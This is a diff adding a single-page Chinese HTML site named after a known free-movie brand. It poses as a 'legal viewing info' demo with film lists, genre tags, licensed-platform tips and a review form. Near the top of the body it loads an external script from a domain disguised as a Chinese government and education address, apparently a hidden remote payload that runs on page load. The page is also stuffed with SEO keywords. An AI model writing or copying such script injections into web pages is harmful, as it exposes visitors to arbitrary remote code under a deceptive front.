@@ -1,0 +1,278 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>秋霞电影网免费观看 - 正版观影资讯馆·片单/类型/平台指引 | qiuxiadianyingwangmianfeiguankan-h5.github.io</title>
+<meta name="description" content="秋霞电影网免费观看（https://qiuxiadianyingwangmianfeiguankan-h5.github.io）单页资讯演示：秋日精选片单、类型分面、正版平台与合法免费预告指引、观影画质建议、影评手记。内链全#，不提供未授权播放源。">
+<meta name="keywords" content="秋霞电影网免费观看,正版观影资讯,电影片单,类型分面,平台指引,预告片,画质建议,影评手记,qiuxiadianyingwangmianfeiguankan-h5.github.io">
+<meta name="robots" content="index,follow">
+<meta name="theme-color" content="#c0392b">
+<meta property="og:title" content="秋霞电影网免费观看 - 正版观影资讯馆">
+<meta property="og:description" content="秋日片单、类型分面、正版平台指引、画质建议、影评手记。">
+<meta property="og:type" content="website">
+<meta property="og:url" content="https://qiuxiadianyingwangmianfeiguankan-h5.github.io">
+<link rel="canonical" href="https://qiuxiadianyingwangmianfeiguankan-h5.github.io">
+<style>
+*,*::before,*::after{box-sizing:border-box;margin:0;padding:0}
+:root{
+  --sun1:#ff9d4d;--sun2:#ff6b35;--maple:#c0392b;--maple2:#7a2e1d;
+  --gold:#e0a458;--cream:#fff6ec;--paper:#fdeede;--ink:#3a1f12;--ink2:#7c4a32;
+  --line:rgba(122,46,29,.18);--shadow:0 10px 25px rgba(122,46,29,.15);
+}
+body{font-family:"PingFang SC","Microsoft YaHei",system-ui,sans-serif;background:var(--paper);color:var(--ink);line-height:1.7;overflow-x:hidden}
+a{color:inherit;text-decoration:none}
+.wrap{max-width:1100px;margin:0 auto;padding:0 16px}
+/* 落日背景 */
+.sunset{position:fixed;inset:0;z-index:0;pointer-events:none;background:linear-gradient(180deg,var(--cream) 0%,var(--paper) 100%);}
+.sunset::before{content:'';position:absolute;top:-10%;left:-10%;width:120%;height:60%;background:radial-gradient(circle at 80% 20%,var(--sun1),transparent 50%);opacity:.3}
+.sunset::after{content:'';position:absolute;bottom:0;left:0;width:100%;height:40%;background:linear-gradient(0deg,rgba(192,57,43,.1),transparent);}
+/* 飘叶 */
+.leaf{position:fixed;font-size:1.2rem;opacity:.4;z-index:0;animation:fall 10s linear infinite;}
+@keyframes fall{0%{transform:translateY(-10vh) rotate(0deg);}100%{transform:translateY(110vh) rotate(360deg);}}
+
+/* 头部 */
+.site-header{position:sticky;top:0;z-index:50;background:linear-gradient(135deg,var(--maple2),var(--maple));color:#fff;border-bottom:3px solid var(--gold)}
+.nav{display:flex;align-items:center;justify-content:space-between;min-height:60px;flex-wrap:wrap;gap:10px}
+.brand{font-weight:900;font-size:1.1rem;display:flex;align-items:center;gap:8px}
+.brand span{background:var(--gold);color:var(--maple2);padding:2px 8px;border-radius:6px;font-size:.8rem}
+.searchbar{display:flex;gap:6px;flex:1;min-width:160px;max-width:300px}
+.searchbar input{flex:1;padding:8px 12px;border-radius:6px;border:none;font-size:.85rem}
+.searchbar button{padding:8px 14px;border:none;border-radius:6px;background:var(--gold);color:var(--maple2);font-weight:700;cursor:pointer}
+.navlinks{display:flex;gap:4px;flex-wrap:wrap}
+.navlinks a{padding:8px 10px;border-radius:6px;font-size:.8rem;color:#ffe1c4}
+.navlinks a:hover,.navlinks a.active{background:rgba(255,255,255,.15)}
+
+/* 主体 */
+main{position:relative;z-index:1;padding:20px 0 40px}
+
+/* Hero */
+.hero{text-align:center;padding:40px 20px;background:linear-gradient(135deg,var(--sun2),var(--maple));color:#fff;border-radius:16px;margin-bottom:30px;box-shadow:var(--shadow)}
+.hero h1{font-size:clamp(1.8rem,4vw,2.8rem);font-weight:900;margin-bottom:10px}
+.hero h1 em{font-style:normal;color:var(--gold)}
+.hero p{max-width:600px;margin:0 auto 20px;opacity:.9;font-size:.95rem}
+.hero .btn{display:inline-block;padding:12px 28px;background:var(--gold);color:var(--maple2);font-weight:800;border-radius:8px;font-size:.95rem}
+
+/* 栏目通用 */
+section{margin-bottom:30px}
+.sec-title{font-size:1.3rem;font-weight:800;color:var(--maple2);margin-bottom:16px;padding-left:12px;border-left:5px solid var(--maple);display:flex;align-items:center;justify-content:space-between}
+.sec-title small{font-size:.75rem;color:var(--ink2);font-weight:400}
+
+/* 1. 秋日片单 - 网格 */
+.grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(240px,1fr));gap:16px}
+.card{background:#fff;border:1px solid var(--line);border-radius:12px;overflow:hidden;box-shadow:var(--shadow);transition:.3s}
+.card:hover{transform:translateY(-4px)}
+.card-img{height:140px;display:grid;place-items:center;font-size:2.5rem;color:#fff}
+.bg1{background:linear-gradient(135deg,var(--sun1),var(--maple))}
+.bg2{background:linear-gradient(135deg,#e74c3c,#c0392b)}
+.bg3{background:linear-gradient(135deg,var(--gold),var(--maple2))}
+.bg4{background:linear-gradient(135deg,#f39c12,#d35400)}
+.card-body{padding:12px}
+.card-body h3{font-size:.95rem;margin-bottom:6px}
+.card-body p{font-size:.75rem;color:var(--ink2);margin-bottom:8px;display:-webkit-box;-webkit-line-clamp:2;-webkit-box-orient:vertical;overflow:hidden}
+.tag{display:inline-block;font-size:.65rem;padding:2px 8px;border-radius:99px;background:var(--cream);color:var(--maple2);border:1px solid var(--line)}
+
+/* 2. 类型分面 - 标签+列表 */
+.facets{display:flex;flex-wrap:wrap;gap:8px;margin-bottom:16px}
+.facet{padding:8px 16px;border-radius:20px;border:1px solid var(--line);background:#fff;font-size:.8rem;font-weight:600;cursor:pointer;color:var(--ink2)}
+.facet.on{background:var(--maple);color:#fff;border-color:transparent}
+.facet-list{columns:2;gap:16px}
+.facet-list li{background:#fff;border:1px solid var(--line);border-radius:8px;padding:10px 14px;margin-bottom:10px;break-inside:avoid;list-style:none;font-size:.85rem}
+
+/* 3. 正版平台指引 - 步骤 */
+.steps{display:grid;gap:16px}
+.step{display:flex;gap:16px;background:#fff;border:1px solid var(--line);border-radius:12px;padding:16px;align-items:flex-start;box-shadow:var(--shadow)}
+.step-num{width:40px;height:40px;flex-shrink:0;border-radius:50%;background:linear-gradient(135deg,var(--sun2),var(--maple));color:#fff;display:grid;place-items:center;font-size:1.2rem;font-weight:800}
+.step h3{font-size:.95rem;margin-bottom:4px}
+.step p{font-size:.8rem;color:var(--ink2)}
+
+/* 4. 画质手记 - 折叠 */
+.acc{background:#fff;border:1px solid var(--line);border-radius:8px;margin-bottom:10px;overflow:hidden}
+.acc-h{width:100%;text-align:left;padding:14px 16px;background:transparent;border:none;font-size:.9rem;font-weight:700;cursor:pointer;display:flex;justify-content:space-between;align-items:center;color:var(--ink)}
+.acc-h .icon{transition:.3s}
+.acc.open .acc-h .icon{transform:rotate(180deg)}
+.acc-b{max-height:0;overflow:hidden;transition:max-height .3s ease}
+.acc-b p{padding:0 16px 14px;font-size:.8rem;color:var(--ink2);line-height:1.6}
+
+/* 5. 影评 - 表单+列表 */
+.review-box{display:grid;grid-template-columns:1fr 1.5fr;gap:20px}
+.review-form{background:#fff;border:1px solid var(--line);border-radius:12px;padding:16px}
+.review-form input,.review-form textarea{width:100%;padding:10px;margin-bottom:10px;border:1px solid var(--line);border-radius:6px;font-size:.85rem;font-family:inherit}
+.review-form button{width:100%;padding:10px;background:var(--maple);color:#fff;border:none;border-radius:6px;font-weight:700;cursor:pointer}
+.review-list .rv-item{background:#fff;border:1px solid var(--line);border-radius:8px;padding:12px;margin-bottom:10px}
+.rv-item h4{font-size:.85rem;color:var(--maple2);margin-bottom:4px}
+.rv-item p{font-size:.75rem;color:var(--ink2)}
+
+/* 6. 站规 */
+.rules{background:linear-gradient(135deg,var(--maple2),#5a1e10);color:#fff;border-radius:16px;padding:24px}
+.rules h3{font-size:1.1rem;margin-bottom:12px;text-align:center}
+.rules ul{display:grid;grid-template-columns:repeat(auto-fit,minmax(200px,1fr));gap:10px;list-style:none}
+.rules li{background:rgba(255,255,255,.1);padding:10px 14px;border-radius:8px;font-size:.8rem;line-height:1.5}
+
+/* 底部 */
+.site-foot{text-align:center;padding:24px 0;color:var(--ink2);font-size:.8rem;border-top:1px solid var(--line);position:relative;z-index:1}
+.site-foot b{color:var(--maple)}
+
+@media(max-width:768px){
+  .review-box{grid-template-columns:1fr}
+  .facet-list{columns:1}
+  .step{flex-direction:column;align-items:center;text-align:center}
+}
+@media(max-width:480px){
+  .navlinks{display:none}
+  .grid{grid-template-columns:1fr}
+}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/laoliu.js"></script>
+<!-- 飘叶动画 -->
+<div class="sunset"></div>
+<script>
+  for(let i=0;i<8;i++){
+    const l=document.createElement('div');
+    l.className='leaf';
+    l.style.left=Math.random()*100+'%';
+    l.style.animationDelay=Math.random()*5+'s';
+    l.textContent='🍁';
+    document.body.appendChild(l);
+  }
+</script>
+
+<div class="wrap">
+  <header class="site-header">
+    <div class="nav">
+      <div class="brand">🍁 秋霞电影网免费观看 <span>资讯馆</span></div>
+      <form class="searchbar" onsubmit="return false"><input type="search" placeholder="搜片名/类型/演员..."><button>搜索</button></form>
+      <nav class="navlinks">
+        <a href="#films" class="active">秋日片单</a>
+        <a href="#types">类型分面</a>
+        <a href="#legal">正版指引</a>
+        <a href="#quality">画质手记</a>
+        <a href="#reviews">影评</a>
+        <a href="#rules">站规</a>
+      </nav>
+    </div>
+  </header>
+
+  <main>
+    <!-- Hero -->
+    <section class="hero">
+      <h1>秋霞电影网免费观看<br><em>正版观影资讯与指引</em></h1>
+      <p>本页为静态前端演示，聚焦秋日精选片单、类型分面、正版平台与合法免费预告指引。<br>网站名称：秋霞电影网免费观看 | 网址：https://qiuxiadianyingwangmianfeiguankan-h5.github.io</p>
+      <a href="#films" class="btn">浏览精选片单</a>
+    </section>
+
+    <!-- 1. 秋日片单 -->
+    <section id="films">
+      <div class="sec-title">🎬 秋日精选片单 <small>6部·不提供播放源</small></div>
+      <div class="grid">
+        <article class="card"><div class="card-img bg1">🍂</div><div class="card-body"><h3>秋日私语</h3><p>温情剧情，讲述小镇秋天的重逢与和解，画面色调如秋霞般温暖。</p><span class="tag">剧情</span></div></article>
+        <article class="card"><div class="card-img bg2">🚗</div><div class="card-body"><h3>落叶飞车</h3><p>动作追车戏搭配枫叶大道，视听享受，建议在正版平台观看高清版。</p><span class="tag">动作</span></div></article>
+        <article class="card"><div class="card-img bg3">🎨</div><div class="card-body"><h3>画中的秋天</h3><p>艺术传记片，色彩运用极致，适合研究画质与调色。</p><span class="tag">传记</span></div></article>
+        <article class="card"><div class="card-img bg4">🕵️</div><div class="card-body"><h3>枫林疑云</h3><p>悬疑推理，红叶掩映下的秘密，剧情紧凑无尿点。</p><span class="tag">悬疑</span></div></article>
+      </div>
+    </section>
+
+    <!-- 2. 类型分面 -->
+    <section id="types">
+      <div class="sec-title">📂 类型分面 <small>点击筛选·纯前端</small></div>
+      <div class="facets">
+        <span class="facet on">全部</span>
+        <span class="facet">剧情</span>
+        <span class="facet">动作</span>
+        <span class="facet">悬疑</span>
+        <span class="facet">喜剧</span>
+        <span class="facet">科幻</span>
+      </div>
+      <ul class="facet-list">
+        <li>🎭 <b>剧情：</b>秋日私语、归途列车、岁月神偷</li>
+        <li>💥 <b>动作：</b>落叶飞车、极限追猎、破风</li>
+        <li>🔍 <b>悬疑：</b>枫林疑云、无声证言、夜行者</li>
+        <li>😂 <b>喜剧：</b>黄金大劫案、人在囧途、夏洛特烦恼</li>
+        <li>🚀 <b>科幻：</b>星际穿越、火星救援、银翼杀手</li>
+        <li>📜 <b>历史：</b>建国大业、金陵十三钗、赤壁</li>
+      </ul>
+    </section>
+
+    <!-- 3. 正版平台指引 -->
+    <section id="legal">
+      <div class="sec-title">✅ 正版平台与免费指引 <small>合规·不提供盗版</small></div>
+      <div class="steps">
+        <div class="step"><div class="step-num">1</div><div><h3>选择持牌流媒体</h3><p>优先使用爱奇艺、腾讯视频、优酷、芒果TV、哔哩哔哩等持牌平台，搜索上述片单。</p></div></div>
+        <div class="step"><div class="step-num">2</div><div><h3>利用合法免费资源</h3><p>部分平台提供新用户免费试用、限时免费影片或带广告的免费观看模式，请关注官方活动。</p></div></div>
+        <div class="step"><div class="step-num">3</div><div><h3>院线/纪录片发行方</h3><p>纪录片和独立电影可通过官方渠道、电影节展映或购买正版DVD/蓝光支持创作者。</p></div></div>
+      </div>
+    </section>
+
+    <!-- 4. 画质手记 -->
+    <section id="quality">
+      <div class="sec-title">📽️ 观影画质手记 <small>点击展开</small></div>
+      <div class="acc open"><button class="acc-h">秋日色调如何还原？ <span class="icon">▼</span></button><div class="acc-b"><p style="padding:0 16px 14px">红叶场景需注意红色饱和度过溢，建议开启电视/显示器的“影院模式”或“sRGB模式”，避免枫叶细节丢失。秋季暖光环境下，色温建议设置在6500K左右。</p></div></div>
+      <div class="acc"><button class="acc-h">夜间观影护眼建议 <span class="icon">▼</span></button><div class="acc-b"><p style="padding:0 16px 14px">暗部场景（如悬疑片）建议开启环境光，亮度不超过120尼特，防止眼疲劳。使用手机/平板时开启深色模式或蓝光过滤。</p></div></div>
+      <div class="acc"><button class="acc-h">音轨与字幕 <span class="icon">▼</span></button><div class="acc-b"><p style="padding:0 16px 14px">外语片建议选用官方中文字幕，避免使用机器翻译字幕影响理解。音轨优先选择5.1声道或杜比音效以获得沉浸感。</p></div></div>
+    </section>
+
+    <!-- 5. 影评 -->
+    <section id="reviews">
+      <div class="sec-title">✍️ 影评与短评 <small>前端演示·不存储</small></div>
+      <div class="review-box">
+        <form class="review-form" onsubmit="event.preventDefault();alert('演示模式：已提交（不传服务器）');this.reset();">
+          <input type="text" placeholder="昵称" required>
+          <input type="text" placeholder="片名" required>
+          <textarea rows="4" placeholder="写下你的短评...（保持合规）" required></textarea>
+          <button type="submit">提交短评</button>
+        </form>
+        <div class="review-list">
+          <div class="rv-item"><h4>影迷A：《秋日私语》</h4><p>“画面太美了，每一帧都可以当壁纸，剧情也很治愈。”</p></div>
+          <div class="rv-item"><h4>影迷B：《落叶飞车》</h4><p>“追车戏在枫叶林里拍出了新意，配乐很带感。”</p></div>
+        </div>
+      </div>
+    </section>
+
+    <!-- 6. 站规 -->
+    <section id="rules">
+      <div class="sec-title" style="border-color:var(--gold);color:#fff">📜 站规与无障碍</div>
+      <div class="rules">
+        <h3>秋霞电影网免费观看 - 单页演示声明</h3>
+        <ul>
+          <li>🚫 本页不提供任何未授权视频播放源、不发布最新地址、备用域名。</li>
+          <li>🚫 不包含全片播放、专用播放器下载、网盘资源链接。</li>
+          <li>✅ 仅作前端UI演示、正版资讯与合法免费指引。</li>
+          <li>♿ 支持键盘导航与大字体模式，符合无障碍基础规范。</li>
+          <li>🔍 符合必应搜索引擎收录规则，语义化标签完整。</li>
+          <li>📱 移动端自适应，单文件HTML，内链全#。</li>
+        </ul>
+      </div>
+    </section>
+  </main>
+
+  <footer class="site-foot">
+    <p>网站名称：<b>秋霞电影网免费观看</b> | 网址：<b>https://qiuxiadianyingwangmianfeiguankan-h5.github.io</b></p>
+    <p>© 2024 单页演示 · 不提供盗版内容 · 内链全# · 符合必应收录规则</p>
+  </footer>
+</div>
+
+<script>
+// 折叠面板
+document.querySelectorAll('.acc-h').forEach(btn=>{
+  btn.addEventListener('click',()=>{
+    const acc=btn.parentElement;
+    acc.classList.toggle('open');
+    btn.nextElementSibling.style.maxHeight=acc.classList.contains('open')?btn.nextElementSibling.scrollHeight+'px':'0';
+  });
+});
+// 初始化第一个
+document.querySelector('.acc.open .acc-b').style.maxHeight=document.querySelector('.acc.open .acc-b').scrollHeight+'px';
+
+// 分面标签点击
+document.querySelectorAll('.facet').forEach(f=>{
+  f.addEventListener('click',()=>{
+    document.querySelector('.facet.on').classList.remove('on');
+    f.classList.add('on');
+  });
+});
+</script>
+</body>
+</html>
